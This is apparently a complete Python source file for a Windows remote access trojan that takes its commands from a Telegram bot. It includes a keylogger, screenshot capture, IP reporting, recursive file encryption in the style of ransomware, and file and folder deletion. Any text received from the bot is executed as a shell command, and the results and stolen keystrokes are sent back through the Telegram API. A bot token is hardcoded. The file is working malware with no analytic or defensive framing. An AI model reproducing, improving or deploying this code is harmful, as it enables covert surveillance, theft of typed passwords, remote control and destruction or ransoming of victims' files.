
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import subprocess
import time
import requests
import threading
import pyautogui
import socket  
import os 
from os import listdir
from os.path import isfile,join

print('start')

key_crypt=b'64anpQ1F__rHalgTiLjqVNcf7TyirzwEqGJQM3fKAC8='
telegram_token = 'Your telegram bot token'
chat_id = 'chat id'

keys=[]
count=0

def send_message(message):
    message=str(message)
    if len(message)>3900:
        message=bytes(message,encoding='ISO-8859-1')
        files={'document':message}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=output.txt",files=files )
    else:
        requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)


def send_files(path,type_file):
    if type_file == 'txt':
        type_file="document"
    elif type_file=='image':
        type_file='photo'
    if '\\'in path[:10]:
        files={type_file:open(path,'rb')}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/send"+type_file.capitalize()+"?chat_id="+chat_id+"&caption=output.txt",files=files )
    else:
        files={type_file:(str(path).encode())}

       
def ip_information():
    r = requests.get(r'http://jsonip.com')
    ip= r.json()['ip']
    IP= format(ip)
    public_ip = IP
    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname)
    ip_in=['public: '+public_ip,'host name: '+hostname,"private: "+IPAddr]
    return ip_in
    
   

class Crypt_my10():
   
    def __init__(self,key):
        self.key=key
        self.up_crypt=0
       
        
    def start_crypt(self):
        p = subprocess.Popen('rd /s /q "C:\process\tuop\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        p.stdout.readlines()
       
    
    def encrypt_data(self,data):
        global en_dt
        fer = Fernet(self.key)
        try:
            data=bytes(data,encoding="utf8")
            en_dt=fer.encrypt(data)
        except:
            en_dt=fer.encrypt(data)
            
        return en_dt


    def decrypt_data(self,data):
        global dec_dt
        fer = Fernet(self.key)
        dec_dt=fer.decrypt(data)
        #dec_dt=str(dec_dt)[2:-1]
        return dec_dt.decode()
    
    
    def encrypt_files(self,path):
        print(inside_up_crypt)
        with open(path,'rb') as file:
            data=file.read()
        
        with open(path,'wb')as file:
            file.write(self.encrypt_data(data))
            if self.up_crypt==0 and inside_up_crypt !=0:
                send_message("successfully encrypted")
            
            
    def decrypt_files(self,path):
        with open(path,'rb')as file:
            data=file.read()
            
        with open(path,'wb') as file:
            dec_data=self.decrypt_data(data)
            file.write(dec_data)
            if self.up_crypt==0 and inside_up_crypt !=0:
                send_message("successfully decrypted")
            
            
    def get_dirs(self,path):
        os.walk(path)
        dir_list=[x[0] for x in os.walk(path)]
        return dir_list
        
        
    def recursive_encrypt_files(self,path):
        self.up_crypt=1
        paths_dir=self.get_dirs(path)
        c=0
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    try:
                        self.encrypt_files(i+'\\'+n)
                        c+=1
                    except:
                        pass
            all_files=[]
        send_message("files that were successfully encrypted: "+str(c))
            
            
    def recursive_decrypt_files(self,path):
        self.up_crypt=1
        paths_dir=self.get_dirs(path)
        c=0
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    try:
                        self.decrypt_files(i+'\\'+n)
                        c+=1
                    except:
                        pass
            all_files=[]
        send_message("files that were successfully decrypted: "+str(c))
            
              
    def sync_recursive_encrypt_files(self,path):
        paths_dir=self.get_dirs(path)
        size=[]
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    size.append(os.path.getsize(i+'\\'+n))
            all_files=[]
            
        self.recursive_encrypt_files(path)
        
        c=0
        sec=''
        faild=''
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    size2=os.path.getsize(i+'\\'+n)
                    p=i+'\\'+n
                    if size2!=size[c]:
                        sec+=f"{p:<70}{' sec':>10}"+'\n'
                    else:
                        faild+=f"{p:<70}{' failde':>10}"+'\n'
                    c+=1
            all_files=[]
            
        if len(sec)+len(faild)<3900:
            send_message(sec+faild)
        else:
            res_send=bytes(sec+faild,encoding='utf8')
            files={'document':res_send}
            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=crypt.txt",files=files )    
        self.start_crypt()
        


class Advanced_files_search:    
    def __init__(self,path,file):
        self.path=path
        self.file=file
    
    
    def search_files_gen(self):
        os.walk(self.path)
        p=len(self.file)
        dir_list=[x[0] for x in os.walk(self.path)]
        res=''
        for i in dir_list:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            for n in all_files:
                if self.file in n:        
                    res+= i+'\\'+n+'\n'
        return res

    def search_files_spec(self):
        os.walk(self.path)
        p=len(self.file)
        dir_list=[x[0] for x in os.walk(self.path)]
        res=''
        for i in dir_list:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            for n in all_files:
                if self.file in n[-p:]:        
                    if len(n)==p:
                        res+= i+'\\'+n+'\n'
        return res
    
    def search_multiple_files(self):
        files=self.file.split(',')
        os.walk(self.path)
        dir_list=[x[0] for x in os.walk(self.path)]
        res=''
        for i in dir_list:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            for n in all_files:
                for j in files:
                    if j in n:
                        res+= i+'\\'+n+'\n'         
        return res
        
        
        
class Delet_files():
    
    def __init__(self):
        self.to_send = ''
        self.sec=[]
        

    def delet_one_file(self,file_path):
        file_path=file_path.replace('\\\\','\\')
        p = subprocess.Popen("del "+file_path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


    def delet_files_list(self,path):
        path=path.replace('\\\\','\\')
        failed=[]
        all_files = [f for f in listdir(path) if isfile(join(path, f))]
        for i in all_files:
            p = subprocess.Popen('del '+ '"'+path+i+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            output=str(p.stdout.readlines())+''
            print(output)
            if len(output)<3:    
                self.sec.append(f'{str(i):<30}{"deleted!":>25}')
            else:
                failed.append(f"{str(i):<30}{'faild!':>25}")

        for i in self.sec:
            self.to_send+=i+'\n'
        for i in failed:
            self.to_send+=i+'\n'
        print(self.to_send)
            
            
    def to_send_res(self,path):
        self.delet_files_list(path)
        if len( self.sec)>0:
            send_message(self.to_send)
       
    
    def recursive_fles_delete(self,path):
        p = subprocess.Popen('rd /s /q "'+path+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        c = p.stdout.readline()
       
    
   
def screen_shot(name):
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir neercs", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    save_image_path= 'C:\\proccess\\neercs\\'+name+'.jpg'
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save(save_image_path)
    
    with open(save_image_path,'rb')as file:
            data=file.read() 
    Crypt_my10(key_crypt).encrypt_files(save_image_path)
    
    files={'photo':data}
    requests.post("https://api.telegram.org/bot"+telegram_token+"/sendPhoto?chat_id="+chat_id+"&caption="+name+".png" ,files=files)
    try:
        Delet_files().delet_one_file(save_image_path)
    except Exception as e:
        print(e)


def on_press(key):
    global count,keys
    keys.append(key)
    count+=1
    
    if count>=1:
        write_to_file(keys)
        keys=[]
        count=0

        
def write_to_file(keys):
    with open('C:\\proccess\\process.txt','ab')as file:
        for i in keys:
            i=str(i)
            file.write(Crypt_my10(key_crypt).encrypt_data(i))
            file.write(b'\n')
            
            

def capture_data():
    data=''
    count_key=0
    key_red_list=[' <Shift> ',' <Backspace> ',' <Ctrl> ',' <Caps_lock> ',' <Left> ',' <Right> '," <Down> "," <Up> "]
    with open('C:\\proccess\\process.txt','rb')as file:
            for i in file:
                s=Crypt_my10(key_crypt).decrypt_data(i)
                s=s.replace("'","")
                print(s)
                if "backspace" in s:
                    s=' <'+"Backspace"+'> '
                elif 'space' in s:
                    s=' '
                elif 'enter' in s:
                    s='\n'
                elif 'shift' in s:
                    s=' <'+'Shift'+'> '
                elif "caps_lock" in s:
                    s=' <'+"Caps_lock"+'> '
                elif "ctrl" in s:
                    s=" <"+'Ctrl'+"> "
                elif '\\x03' in s:
                    s=' c '
                elif '\\x16' in s:
                    s=' v '
                elif 'left' in s:
                    s=' <Left> '
                elif 'right' in s:
                    s=' <Right> '
                elif 'down'in s:
                    s=" <Down> "
                elif 'up' in s:
                    s=" <Up> "
                else:
                    s=s
            
                if s==data[-len(s):]and s in key_red_list:
                    count_key+=1
                else:
                    if count_key>1:
                        data=data[:-1]+"("+(str(count_key))+')> '+s
                        count_key=0
                    else:
                        data+=s
            
            if count_key>1:
                data=data[:-1]+"("+(str(count_key))+')> '
                count_key=0
            send_message(data)
            file.close()
    f=open('C:\\proccess\\process.txt','w')
    f.write('')

    

def read_messages():
    global offset,message_data
    base_url='https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/getUpdates?offset='+offset
    resp = requests.get(base_url)
    messages=resp.text
    messages=messages.replace("update_id","^^^@^@").split('^^^')
    messages=messages[-1]        
    messages=str(messages)

    offset=''
    for i in range(len(messages)):
        if messages [i:i+3]=='@^@':
            for n in range(i+5,10000):
                if messages[n]!=',':
                    offset+=messages[n]
                else:
                    break
            break

    time.sleep(0.6)
    message_data=''
    for i in range(len(messages)):
        if messages[i:i+4] == 'text':
            for n in range(i+7,100000):
                if messages[n:n+5]!='"}}]}' and messages[n:n+12]!=',"entities":':
                       message_data+=messages[n]
                else:
                    break
            break
    return [message_data[1:-1],offset]
    
    
def start_project():
        global offset,key_crypt,inside_up_crypt
        offset=''
        ffo=0
        c=0
        while True:
            try:
                conect_ip=ip_information()
                send_message(conect_ip[0]+' is conect\n'+conect_ip[1])
                break
            except:
                time.sleep(3)

        while True:
            try:
                time.sleep(0.5)
                command=read_messages()
                off=command[-1]
                command=command[0]
                
                if off!=ffo:
                    print(command)
                    c+=1
                    ffo=off
                    if c>1:
                        print(command,'0')
                        if "captur keyloger" in command:
                            capture_data()
                            
                        
                        elif command[:12]== "encrypt file":
                            Crypt_my10(key).encrypt_files(command[13:])
                            inside_up_crypt=1
                        elif command [:12]== "decrypt file":
                            Crypt_my10(key).decrypt_files(command[13:])
                            inside_up_crypt=1
                        elif command[:14]=='encrypt folder' and '-s'not in command[:18]:
                            Crypt_my10(key).recursive_encrypt_files(command[15:])
                        elif command[:14]=="decrypt folder" and '-s'not in command[:18]:
                            Crypt_my10(key).recursive_decrypt_files(command[15:])
                        elif command[:17]=='encrypt folder -s':
                            Crypt_my10(key).sync_recursive_encrypt_files(command[18:])


                        elif 'get ip info' in command:
                            data=''
                            for i in conect_ip:
                                data+=i+'\n'
                            send_message(data)


                        elif "screen shot" in command:
                            inside_up_crypt=0
                            screen_shot('zew')

                        elif "search file -g" in command:
                            command=command.split('name=')
                            output=Advanced_files_search(command[0][15:-1],command[-1]).search_files_gen()
                            if len(output)>1:
                                send_message(output)
                            else:
                                send_message(command[-1]+'not found..')
                            

                        else:
                            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                            data=''
                            for i in p.stdout.readlines():
                                data+=i.decode()
                            print(data)        
                            p.wait
                            send_message(data)
            except Exception as e:
                e=str(e)
                try:
                    send_message(e)
                except Exception as e:
                    print(e)  
                time.sleep(3)
            time.sleep(2)                          
        
       
def start_key_log():
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__=="__main__":
    Thread1 = threading.Thread(target=start_project)
    Thread2 = threading.Thread(target=start_key_log)
    Thread1.start()
    Thread2.start()
    Thread1.join()
    Thread2.join()
